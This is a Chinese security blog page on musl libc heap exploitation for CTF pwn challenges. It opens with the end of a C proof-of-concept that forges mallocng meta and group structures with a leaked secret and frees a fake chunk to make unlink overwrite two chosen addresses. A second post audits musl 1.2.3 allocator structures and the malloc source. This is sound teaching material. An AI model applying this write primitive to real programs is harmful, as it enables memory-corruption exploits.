UNDEFINED, <span class="string">&quot;上面分配的所有meta均在同一个meta_area中，地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\n\033[0m&quot;</span>, area);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以由此获取到secret的值为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%#llx\n\n\033[0m&quot;</span>, area-&gt;check);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> secret = area-&gt;check;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们来伪造chunk以及其上的结构。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* mmap_space = mmap((<span class="type">void</span>*)<span class="number">0xdeadbeef000</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = <span class="number">7</span>;       <span class="comment">// group中保存的chunk大小，这里设置为0x80</span></span><br><span class="line">    fake_meta-&gt;last_idx = <span class="number">4</span>;        <span class="comment">// group中chunk的总数，这里设置为4表示chunk总数为5</span></span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;        <span class="comment">// 通过okay_to_free检查</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;    <span class="comment">// 通过检查1</span></span><br><span class="line">    fake_group-&gt;meta = fake_meta;   <span class="comment">// 使group能够找到meta</span></span><br><span class="line">    fake_meta-&gt;avail_mask = <span class="number">0b11101</span>;<span class="comment">// 使nontrivial_free进入if循环，得以执行dequeue</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* fake_chunk = (<span class="type">char</span>*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span> + <span class="number">0x10</span> + <span class="number">0x80</span>);</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">short</span> *)(fake_chunk - <span class="number">2</span>) = <span class="number">8</span>;    <span class="comment">// offset</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">char</span>*)(fake_chunk - <span class="number">3</span>) = <span class="number">1</span>;      <span class="comment">// index</span></span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;绕过第1个检查，只需要设置meta中的group指针为假group指针即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第2个检查需要正确设置chunk的index值，本程序释放的是group中第2个chunk，因此索引为1。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意索引值存放的位置，是chunk地址-3这个字节。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第3个检查需要我们提前泄露secret的值，并填写到meta_area中。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;检查4和5只需要正确计算chunk的大小，填写chunk的索引值即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序尝试释放sizeclass=7的chunk，即chunk大小为0x80，因此第2个chunk的索引为0x80&gt;&gt;4=8。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;索引值index保存在chunk的前面两个字节中，正确填入即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;正确设置index后，检查6一般也是没有问题的。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在通过get_meta的检查后，还需要通过nontrivial_free中的if语句条件判断。\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 72)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo nontrivial_free(struct meta *g, int i)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t self = 1u&lt;&lt;i;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))\033[1;&quot;</span> PURPLE <span class="string">&quot;m &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// any multi-slot group is necessarily on an active list\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// here, but single-slot groups might or might not be.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (g-&gt;next) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tint activate_new = (ctx.active[sc]==g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tdequeue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\tactivate_group(ctx.active[sc]);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\treturn free_group(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else if (!mask) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// might still be active if there were no allocations\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// after last available slot was taken.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (ctx.active[sc] != g) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tqueue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\ta_or(&amp;g-&gt;freed_mask, self);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct mapinfo)&#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只需要修改meta中的freeable字段为1即可通过该检查。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后还需要在free_group中进入正确的else分支：\n\n&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 14)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo free_group(struct meta *g)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct mapinfo mi = &#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (sc &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tctx.usage_by_class[sc] -= g-&gt;last_idx+1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (g-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstep_seq();\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\trecord_seq(sc);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.base = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.len = g-&gt;maplen*4096UL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tvoid *p = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstruct meta *m = get_meta(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tint idx = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tg-&gt;mem-&gt;meta = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// not checking size/reserved here; it&#x27;s intentionally invalid\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi = nontrivial_free(m, idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfree_meta(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn mi;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这需要我们设置meta-&gt;maplen为非零值，防止再次进入nontrivial_free。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这里的maplen就设置为group占用的页数量即可。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们向meta的两个链表指针写入事先准备好的地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;prev写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_1);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;next写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_2);</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = (<span class="keyword">struct</span> meta*)victim_1;</span><br><span class="line">    fake_meta-&gt;next = (<span class="keyword">struct</span> meta*)victim_2;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面调用free函数释放这个假chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;释放后，目标地址附近的值已经被成功修改：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim_1, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这证明使用一个假chunk修改两个地址的值是可行的，在free之后，chunk所在的页被释放了，这样就不会对接下来的进一步利用造成其他任何影响了。</p>
<p>为了利用unlink，我们需要构造很多东西，不能落下其中任何一个，在解题与学习时要特别注意。在下一篇文章中笔者将会分析unlink如何与FILE结构体配合，从而最终getshell。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">musl pwn 入门 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:39:21" itemprop="dateCreated datePublished" datetime="2023-02-28T22:39:21+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近年来，musl libc作为一个轻量级的libc越来越多地出现在CTF pwn题之中，其和glibc相比有一定的差距，因此本文我们就musl libc最常考的考点——内存分配，进行musl libc的源代码审计。</p>
<p>不同于glibc多达四五千行代码，大小超过10w字节的malloc.c，musl libc中的malloc.c大小甚至都不到1w字节，其轻量级的特性也使得我们更加容易去阅读它的代码。</p>
<p>musl libc在内存分配上经历过一次大的改动（1.2.0-&gt;1.2.1），本文针对发文时的最新版本1.2.3进行分析。</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269533.htm#msg_header_h3_6">传送门</a></p>
<h1 id="1-主要数据结构"><a class="markdownIt-Anchor" href="#1-主要数据结构"></a> 1. 主要数据结构</h1>
<h2 id="malloc_context"><a class="markdownIt-Anchor" href="#malloc_context"></a> malloc_context</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">	<span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">int</span> init_done;</span><br><span class="line">	<span class="type">unsigned</span> mmap_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">	<span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">	<span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">	<span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">	<span class="type">uint8_t</span> seq;</span><br><span class="line">	<span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个结构体是musl libc的堆管理最上层结构，其中字段的含义分别为：</p>
<ul>
<li><code>uint64_t secret</code>：一个随机生成的数，用于检查<code>meta</code>的合法性，也即一个check guard</li>
<li><code>size_t pagesize</code>：页大小，在x86_64下一般为为0x1000</li>
<li><code>int init_done</code>：判断<code>malloc_context</code>是否初始化完成，在<code>alloc_meta</code>函数中进行检查，如果没有则进行初始化，否则跳过初始化流程</li>
<li><code>unsigned mmap_counter</code>：mmap计数器，通过mmap分配了多少次空间用于内存分配</li>
<li><code>struct meta *free_meta_head</code>：被释放的<code>meta</code>结构体构成的链表表头，<code>meta</code>结构体是musl libc内存分配的低一级结构，后面会提到</li>
<li><code>struct meta *avail_meta</code>：空闲的<code>meta</code>结构体构成的链表表头</li>
<li><code>size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift</code>：
<ul>
<li><code>size_t avail_meta_count</code>：空闲<code>meta</code>的数量</li>
<li><code>size_t avail_meta_area_count</code>：空闲<code>meta_area</code>的数量，<code>meta_area</code>是<code>meta</code>的控制结构</li>
<li><code>size_t meta_alloc_shift</code>：&lt;暂缺&gt;</li>
</ul>
</li>
<li><code>struct meta_area *meta_area_head, *meta_area_tail</code>：<code>meta_area</code>链表表头，链表表尾</li>
<li><code>unsigned char *avail_meta_areas</code>：&lt;暂缺&gt;</li>
<li><code>struct meta *active[48]</code>：可以继续分配的<code>meta</code></li>
<li><code>size_t usage_by_class[48]</code>：对应大小的缓存的所有<code>meta</code>的<code>group</code>所管理的chunk个数</li>
<li><code>uint8_t unmap_seq[32], bounces[32]</code>：&lt;暂缺&gt;</li>
<li><code>uint8_t seq</code>：&lt;暂缺&gt;</li>
<li><code>uintptr_t brk</code>：记录目前的<code>brk(0)</code></li>
</ul>
<p>其中有一些字段无法通过简单查看代码得到，需要进一步代码审计获取其含义，我们后面再进行补充。</p>
<h2 id="meta_area"><a class="markdownIt-Anchor" href="#meta_area"></a> meta_area</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> check;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">int</span> nslots;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个结构用于管理一页内的所有<code>meta</code>结构，属于<code>malloc_context</code>的下级结构，<code>meta</code>的上级结构。</p>
<ul>
<li><code>uint64_t check</code>：检查字段，与<code>malloc_context</code>中的<code>secret</code>字段对应，检查该<code>meta_area</code>是否可能被修改</li>
<li><code>struct meta_area *next</code>：下一个<code>meta_area</code>的地址，构成链表</li>
<li><code>int nslots</code>：该<code>meta_area</code>中管理的<code>meta</code>数量，一般为固定值</li>
<li><code>struct meta slots[]</code>：管理的<code>meta</code>数组</li>
</ul>
<h2 id="meta"><a class="markdownIt-Anchor" href="#meta"></a> meta</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">	<span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">	<span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">	<span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>meta</code>中保存有<code>group</code>结构体指针，后者直接保存有需要分配的内存块。即<code>meta</code>和其管理的内存块可能不在同一个page中。</p>
<ul>
<li><code>struct meta *prev, *next</code>：前后<code>meta</code>，构成双向链表</li>
<li><code>struct group *mem</code>：管理的<code>group</code>结构体指针</li>
<li><code>volatile int avail_mask, freed_mask</code>：掩码的形式，用一个bit表示存在与否</li>
<li><code>uintptr_t last_idx:5</code>：该<code>meta</code>中最后一个chunk的索引</li>
<li><code>freeable:1</code>：该<code>meta</code>中的chunk是否能够被释放</li>
<li><code>uintptr_t sizeclass:6</code>：管理的group的大小。如果mem是mmap分配，固定为63</li>
<li><code>uintptr_t maplen:8*sizeof(uintptr_t)-12</code>：如果管理的group是mmap分配的，则为内存页数，否则为0</li>
</ul>
<h2 id="group"><a class="markdownIt-Anchor" href="#group"></a> group</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>group</code>中即保存有需要分配出去的chunk。</p>
<ul>
<li><code>struct meta *meta</code>：所属的<code>meta</code>的地址</li>
<li><code>unsigned char active_idx:5</code>：5个比特，表示还有多少可用chunk</li>
<li><code>char pad[UNIT - sizeof(struct meta *) - 1]</code>：手动16字节对齐</li>
<li><code>unsigned char storage[]</code>：要分配出去的内存空间，chunk</li>
</ul>
<hr />
<p>以上就是musl libc中主要的数据结构，下面我们通过代码审计彻底搞清楚musl libc的内存分配机制。</p>
<h1 id="2-代码审计"><a class="markdownIt-Anchor" href="#2-代码审计"></a> 2. 代码审计</h1>
<p>我们首先从内存分配相关的函数开始看起。对于辅助性的较为复杂的函数使用小标题的形式进行分析，辅助性的较为简单的函数只在第一次出现时直接写到主要函数分析代码中进行简单解释。</p>
<h2 id="mallocsrcmallocmallocngmallocc-line-299"><a class="markdownIt-Anchor" href="#mallocsrcmallocmallocngmallocc-line-299"></a> malloc（<code>/src/malloc/mallocng/malloc.c line 299</code>）</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">	<span class="type">uint32_t</span> mask, first;</span><br><span class="line">	<span class="type">int</span> sc;</span><br><span class="line">	<span class="type">int</span> idx;</span><br><span class="line">	<span class="type">int</span> ctr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">		<span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		wrlock();</span><br><span class="line">		step_seq();</span><br><span class="line">		g = alloc_meta();</span><br><span class="line">		<span class="keyword">if</span> (!g) &#123;</span><br><span class="line">			unlock();</span><br><span class="line">			munmap(p, needed);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		g-&gt;mem = p;</span><br><span class="line">		g-&gt;mem-&gt;meta = g;</span><br><span class="line">		g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">		g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">		g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">		g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">		g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">		<span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">		ctx.mmap_counter++;</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">	rdlock();</span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line">	<span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line">	<span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line">	<span class="comment">// 7 or 